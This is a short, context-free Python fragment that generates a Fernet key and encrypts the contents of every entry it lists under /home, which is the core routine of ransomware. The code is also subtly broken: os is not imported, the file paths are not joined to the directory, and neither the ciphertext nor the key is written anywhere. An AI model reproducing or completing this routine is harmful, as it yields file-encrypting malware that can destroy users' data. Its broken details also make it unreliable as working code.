from cryptography.fernet import Fernet
key = Fernet.generate_key()
f = Fernet(key)
for fpath in os.listdir("/home"):
    with open(fpath, "rb") as fi:
        data = fi.read()
    enc = f.encrypt(data)